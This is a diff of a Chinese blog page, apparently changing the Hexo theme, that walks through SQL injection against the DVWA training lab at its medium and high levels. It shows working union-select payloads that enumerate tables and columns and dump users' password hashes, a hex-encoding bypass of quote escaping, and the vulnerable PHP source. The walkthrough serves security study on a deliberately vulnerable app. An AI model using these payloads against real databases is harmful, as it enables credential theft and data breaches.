 <h4 id="获取当前数据库-1"><a href="#获取当前数据库-1" class="headerlink" title="获取当前数据库"></a><strong>获取当前数据库</strong></h4><p> <code>抓包更改参数id为1 union select 1,database() #，查询成功：</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/11/11/Ml0j0g.png" alt="Ml0j0g.png" title>
-                </div>
-                <div class="image-caption">Ml0j0g.png</div>
-            </figure>
-
+<p><img src="https://s2.ax1x.com/2019/11/11/Ml0j0g.png" alt="Ml0j0g.png"></p>
 <p><code>说明当前的数据库为dvwa。</code></p>
 <h4 id="获取数据库中的表-1"><a href="#获取数据库中的表-1" class="headerlink" title="获取数据库中的表"></a><strong>获取数据库中的表</strong></h4><p><code>抓包更改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/11/11/MlBK91.png" alt="MlBK91.png" title>
-                </div>
-                <div class="image-caption">MlBK91.png</div>
-            </figure>
-
+<p><img src="https://s2.ax1x.com/2019/11/11/MlBK91.png" alt="MlBK91.png"></p>
 <p><code>说明数据库dvwa中一共有两个表，guestbook与users。</code></p>
 <h4 id="获取表中的字段名-1"><a href="#获取表中的字段名-1" class="headerlink" title="获取表中的字段名"></a><strong>获取表中的字段名</strong></h4><p><code>抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users ’#，查询失败：</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/11/11/Mls0jx.png" alt="Mls0jx.png" title>
-                </div>
-                <div class="image-caption">Mls0jx.png</div>
-            </figure>
-
+<p><img src="https://s2.ax1x.com/2019/11/11/Mls0jx.png" alt="Mls0jx.png"></p>
 <p> 这是因为单引号被转义了，变成了\’。可以利用16进制进行绕过 ‘’ </p>
 <p><code>抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #，查询成功：</code><img src="https://s2.ax1x.com/2019/11/11/MlrFwF.png" alt="MlrFwF.png"></p>
 <p><code>说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</code></p>
 <h4 id="下载数据-1"><a href="#下载数据-1" class="headerlink" title="下载数据"></a><strong>下载数据</strong></h4><p><code>抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/11/11/MlraOf.png" alt="MlraOf.png" title>
-                </div>
-                <div class="image-caption">MlraOf.png</div>
-            </figure>
-
+<p><img src="https://s2.ax1x.com/2019/11/11/MlraOf.png" alt="MlraOf.png"></p>
 <h3 id="级别：high"><a href="#级别：high" class="headerlink" title="级别：high"></a>级别：high</h3><h4 id="SQL-Injection-Source"><a href="#SQL-Injection-Source" class="headerlink" title="SQL Injection Source"></a>SQL Injection Source</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">'id'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_SESSION[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">        $last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h4 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a><strong>分析：</strong></h4><p> 与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。 </p>
 <h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a><strong>漏洞利用:</strong></h4><p> 虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。 </p>
 <p><code>输入1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/11/12/M3q1r6.png" alt="M3q1r6.png" title>
-                </div>
-                <div class="image-caption">M3q1r6.png</div>
-            </figure>
-
+<p><img src="https://s2.ax1x.com/2019/11/12/M3q1r6.png" alt="M3q1r6.png"></p>
 <p><strong>特别注意：</strong>High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</p>
 <p><strong>参考链接：</strong> <a href="https://www.jianshu.com/p/e51cd8f15a84" target="_blank" rel="noopener">https://www.jianshu.com/p/e51cd8f15a84</a> </p>
 
-        </div>
-
-        <blockquote class="post-copyright">
-    
-    <div class="content">
-        
-<span class="post-time">
-    最終更新：<time datetime="2019-11-22T01:30:33.721Z" itemprop="dateUpdated">2019-11-22 09:30:33</time>
-</span><br>
-
-
-        
-        这里可以写作者留言，标签和 hexo 中所有变量及辅助函数等均可调用，示例：<a href="/2019/10/28/DVWA-SQL-Injection/" target="_blank" rel="external">https://1187100546.github.io/2019/10/28/DVWA-SQL-Injection/</a>
-        
+      
     </div>
     
-    <footer>
-        <a href="https://1187100546.github.io">
-            <img src="/img/avatar.jpg" alt="huahua">
-            huahua
-        </a>
-    </footer>
-</blockquote>
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/10/28/DVWA-SQL-Injection/">DVWA-SQL_Injection(SQL注入)</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">huahua</a></p>
+        <p><span>发布时间:</span>2019-10-28, 19:39:18</p>
+        <p><span>最后更新:</span>2019-11-22, 09:30:33</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/10/28/DVWA-SQL-Injection/" title="DVWA-SQL_Injection(SQL注入)">https://1187100546.github.io/2019/10/28/DVWA-SQL-Injection/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://1187100546.github.io/2019/10/28/DVWA-SQL-Injection/　　作者: huahua" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
 
+
+
+    <nav id="article-nav">
         
-<div class="page-reward">
-    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
-</div>
-
-
-
-        <div class="post-footer">
-            
-	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
-
-
-            
-<div class="page-share-wrap">
-    
-
-<div class="page-share" id="pageShare">
-    <ul class="reset share-icons">
-      <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://1187100546.github.io/2019/10/28/DVWA-SQL-Injection/&title=《DVWA-SQL_Injection(SQL注入)》 — 花花的blog&pic=https://1187100546.github.io/img/avatar.jpg" data-title="微博">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      <li>
-        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://1187100546.github.io/2019/10/28/DVWA-SQL-Injection/&title=《DVWA-SQL_Injection(SQL注入)》 — 花花的blog&source=DVWA里的SQL注入。" data-title=" QQ">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://1187100546.github.io/2019/10/28/DVWA-SQL-Injection/" data-title=" Facebook">
-          <i class="icon icon-facebook"></i>
-        </a>
-      </li>
-      <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《DVWA-SQL_Injection(SQL注入)》 — 花花的blog&url=https://1187100546.github.io/2019/10/28/DVWA-SQL-Injection/&via=https://1187100546.github.io" data-title=" Twitter">
-          <i class="icon icon-twitter"></i>
-        </a>
-      </li>
-      <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://1187100546.github.io/2019/10/28/DVWA-SQL-Injection/" data-title=" Google+">
-          <i class="icon icon-google-plus"></i>
-        </a>
-      </li>
-    </ul>
- </div>
-
-
-
-    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
-        <i class="icon icon-share-alt icon-lg"></i>
-    </a>
-</div>
-
-
-
-        </div>
-    </div>
-
-    
-<nav class="post-nav flex-row flex-justify-between">
-  
-    <div class="waves-block waves-effect prev">
-      <a href="/2019/11/12/DVWA-SQL-Injection-Blind/" id="post-prev" class="post-nav-link">
-        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
-        <h4 class="title">DVWA-SQL_Injection_Blind（sql盲注）</h4>
-      </a>
-    </div>
-  
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2019/11/12/DVWA-SQL-Injection-Blind/">
+                    DVWA-SQL_Injection_Blind（sql盲注）
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/10/28/算法实验考试/">
+                    算法实验考试
+                </a>
+            </div>
+        
+    </nav>
 
   
-    <div class="waves-block waves-effect next">
-      <a href="/2019/10/28/算法实验考试/" id="post-next" class="post-nav-link">
-        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
-        <h4 class="title">算法实验考试</h4>
-      </a>
-    </div>
-  
-</nav>
-
-
-
-    
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 </article>
 
-<div id="reward" class="page-modal reward-lay">
-    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <h3 class="reward-title">
-        <i class="icon icon-quote-left"></i>
-        谢谢大爷~
-        <i class="icon icon-quote-right"></i>
-    </h3>
-    <div class="reward-content">
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
         
-        <div class="reward-code">
-            <img id="rewardCode" src="/img/wechatpay.png" alt="打赏二维码">
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#级别：low"><span class="toc-number">1.</span> <span class="toc-text">级别：low</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#查看源码"><span class="toc-number">1.1.</span> <span class="toc-text">查看源码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#分析："><span class="toc-number">1.2.</span> <span class="toc-text">分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#判断是否存在注入，注入是字符型还是数字型"><span class="toc-number">1.3.</span> <span class="toc-text">判断是否存在注入，注入是字符型还是数字型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#猜解SQL查询语句中的字段数"><span class="toc-number">1.4.</span> <span class="toc-text">猜解SQL查询语句中的字段数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#确认显示的字段顺序"><span class="toc-number">1.5.</span> <span class="toc-text">确认显示的字段顺序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#获取当前数据库"><span class="toc-number">1.6.</span> <span class="toc-text">获取当前数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#获取数据库中的表"><span class="toc-number">1.7.</span> <span class="toc-text">获取数据库中的表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#获取表中的字段名"><span class="toc-number">1.8.</span> <span class="toc-text">获取表中的字段名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#下载数据"><span class="toc-number">1.9.</span> <span class="toc-text">下载数据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#级别：medium"><span class="toc-number">2.</span> <span class="toc-text">级别：medium</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分析"><span class="toc-number">2.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#判断是否存在注入，注入是字符型还是数字型-1"><span class="toc-number">2.2.</span> <span class="toc-text">判断是否存在注入，注入是字符型还是数字型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#猜解SQL查询语句中的字段数-1"><span class="toc-number">2.3.</span> <span class="toc-text">猜解SQL查询语句中的字段数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#确定显示的字段顺序"><span class="toc-number">2.4.</span> <span class="toc-text">确定显示的字段顺序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#获取当前数据库-1"><span class="toc-number">2.5.</span> <span class="toc-text">获取当前数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#获取数据库中的表-1"><span class="toc-number">2.6.</span> <span class="toc-text">获取数据库中的表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#获取表中的字段名-1"><span class="toc-number">2.7.</span> <span class="toc-text">获取表中的字段名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#下载数据-1"><span class="toc-number">2.8.</span> <span class="toc-text">下载数据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#级别：high"><span class="toc-number">3.</span> <span class="toc-text">级别：high</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection-Source"><span class="toc-number">3.1.</span> <span class="toc-text">SQL Injection Source</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#分析：-1"><span class="toc-number">3.2.</span> <span class="toc-text">分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞利用:</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-6 i,
+        .toc-level-6 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
         </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"DVWA-SQL_Injection(SQL注入)　| 花花的blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
         
-        <label class="reward-toggle">
-            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
-                data-wechat="/img/wechatpay.png" data-alipay="/img/alipay.jpg">
-            <div class="reward-toggle-ctrol">
-                <span class="reward-toggle-item wechat">微信</span>
-                <span class="reward-toggle-label"></span>
-                <span class="reward-toggle-item alipay">支付宝</span>
+            <a href="/2019/11/12/DVWA-SQL-Injection-Blind/" title="上一篇: DVWA-SQL_Injection_Blind（sql盲注）">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/10/28/算法实验考试/" title="下一篇: 算法实验考试">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/01/12/md5/">MD5加密</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/12/RSA/">公钥密码RSA</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/03/des/">分组密码DES</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/03/lsfr/">序列密码</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/03/gudianmima/">古典密码</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/03/java-4/">java第四次实验作业</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/03/java-3/">java第三次实验作业</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/30/java-2/">java第二次实验作业</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/29/java-fujia/">java继承实现多态的例子</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/26/java-shiyan-3/">java实验三</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/26/java-shiyan-2/">java实验二</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/24/spawn-failed/">hexo发生error：spawn failed错误的解决方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/19/网安作业3/">网安作业3</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/14/xss-stored/">DVWA--xss_stored</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/14/xss-reflected/">DVWA--xss_reflected</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/12/DVWA-SQL-Injection-Blind/">DVWA-SQL_Injection_Blind（sql盲注）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/28/DVWA-SQL-Injection/">DVWA-SQL_Injection(SQL注入)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/28/算法实验考试/">算法实验考试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/26/算法实验作业/">算法实验作业</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/25/算法实验4/">算法实验（四）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/24/算法实验3/">算法实验（三）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/23/算法实验2/">算法实验（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/22/Brute_Force/">DVWA-Brute_Force暴力破解</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/22/算法实验1/">算法实验（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/21/算法作业2/">算法作业（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/20/算法作业1/">算法作业（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/13/XSS攻击简单示例/">XSS攻击简单示例</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/13/教育部取消毕业前补考的意见/">教育部取消毕业前补考的意见(某人的毛概作业)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/13/利用sqlmap注入dvwa/">利用sqlmap注入dvwa</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/12/简单sql注入环境搭建及注入/">简单sql注入环境搭建及注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/11/msf攻击windows/">msf攻击windows</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/11/一天是不良人，一辈子都是不良人/">一天是不良人，一辈子都是不良人</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/10/hello-world/">Hello World</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      
+<footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2018-2020 huahua
             </div>
-        </label>
+ 
+ 
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+ 
+ 
         
-    </div>
-</div>
-
-
-
-</div>
-
-        <footer class="footer">
-    <div class="top">
-        
-<p>
-    <span id="busuanzi_container_site_uv" style='display:none'>
-        站点总访客数：<span id="busuanzi_value_site_uv"></span>
-    </span>
-    <span id="busuanzi_container_site_pv" style='display:none'>
-        站点总访问量：<span id="busuanzi_value_site_pv"></span>
-    </span>
-</p>
-
-
-        <p>
-            
-                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
-            
-            <span>このブログの内容物は<a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
-        </p>
-    </div>
-    <div class="bottom">
-        <p><span>huahua &copy; 2018 - 2020</span>
-            <span>
+ 
+ 
+            <div class="visit">
                 
-                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
-            </span>
-        </p>
+                    <span style='display:inline'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i>本站总访问量<span id="busuanzi_value_site_pv"></span>次
+                        </span>
+                    </span>
+                
+ 
+ 
+                
+                    <span>| </span>
+                
+ 
+ 
+                
+                    <span style='display:inline'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i>本页面被访问<span id="busuanzi_value_page_pv"></span>次
+                        </span>
+                    </span>
+                
+ 
+                
+                    <span>| </span>
+                
+ 
+ 
+                
+                    <span style='display:inline'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-user" aria-hidden="true"></i>本站访客数<span id="busuanzi_value_site_uv"></span>人
+                        </span>
+                    </span>
+                
+ 
+                
+            </div>
+        
     </div>
 </footer>
-
-    </main>
-    <div class="mask" id="mask"></div>
-<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
-
-
-
-<div class="global-share" id="globalShare">
-    <ul class="reset share-icons">
-      <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://1187100546.github.io/2019/10/28/DVWA-SQL-Injection/&title=《DVWA-SQL_Injection(SQL注入)》 — 花花的blog&pic=https://1187100546.github.io/img/avatar.jpg" data-title="微博">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      <li>
-        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://1187100546.github.io/2019/10/28/DVWA-SQL-Injection/&title=《DVWA-SQL_Injection(SQL注入)》 — 花花的blog&source=DVWA里的SQL注入。" data-title=" QQ">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://1187100546.github.io/2019/10/28/DVWA-SQL-Injection/" data-title=" Facebook">
-          <i class="icon icon-facebook"></i>
-        </a>
-      </li>
-      <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《DVWA-SQL_Injection(SQL注入)》 — 花花的blog&url=https://1187100546.github.io/2019/10/28/DVWA-SQL-Injection/&via=https://1187100546.github.io" data-title=" Twitter">
-          <i class="icon icon-twitter"></i>
-        </a>
-      </li>
-      <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://1187100546.github.io/2019/10/28/DVWA-SQL-Injection/" data-title=" Google+">
-          <i class="icon icon-google-plus"></i>
-        </a>
-      </li>
-    </ul>
- </div>
-
-
-<div class="page-modal wx-share" id="wxShare">
-    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACKklEQVR42u3aQY7DIAwF0N7/0p1tpRnSbxykCTxWUZuQPBYWtnm94vH+Naq/f/77ec/oXa8VAwMD47GM9+VIPiv53NG/c8vxxzwYGBgHMK4DXx5kk/uvg+/o+ss3Y2BgYATbtSQoj2bDwMDAWMeYfGWwHBgYGBhzSezoqXy2fnp8Qy6OgYHxQEYnCK6+XtLfwMDAeBTjXRzXm7NqsB4F7vJXYWBgbM3olNLyj8hbBfm2DwMD4xxGXkTLj1bk9yTb0OgXDAyMAxjXH52U2DrJ8Fzjc7jDxcDAOIxRnXQu+uXHNYaLgoGBsTUjf7gVEIPNYvXOQicWAwNjI0Zen6sW/atvyefEwMA4h9E5YJEsR7941yJhYGBswShvwhaE2mQhviTGGBgYmzJuSB3j1Zo7+FU+LYKBgXEMI09x8+B7V+Oz0BfFwMDYjrG6fpUfgS0vOgYGxtaMudJ/tW0wF7LLgRgDA+MARp6ydtLaTgvhS7KNgYFxACMpvXWOouZ3Vot3GBgYGJ3CXLXcP7cEGBgY5zDmymTVxsAcptUewMDA2I7ROaQ1V4arNjiH92NgYGzKeBdHXsq/q1QXBVwMDIytGdVmYVIOS7Z3+RL0m6MYGBh7MPLSfCfFrW40q09hYGCcwKgGvrmmY771LDdHMTAwMBZc56H8hv4GBgYGxlSC2inPLQ+4GBgY/5JR3eqtOJYx1wTFwMA4gZGnjkkbMk9NkxlubmpiYGA8j/ED4cDbGesjKLYAAAAASUVORK5CYII=" alt="微信分享二维码">
-</div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
 
 
 
 
-    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
-<script>
-var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
 
+    <script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
 
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
 </script>
 
-<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+<script src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
 
 
-<div class="search-panel" id="search-panel">
-    <ul class="search-result" id="search-result"></ul>
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
 </div>
-<template id="search-tpl">
-<li class="item">
-    <a href="{path}" class="waves-block waves-effect">
-        <div class="title ellipsis" title="{title}">{title}</div>
-        <div class="flex-row flex-middle">
-            <div class="tags ellipsis">
-                {tags}
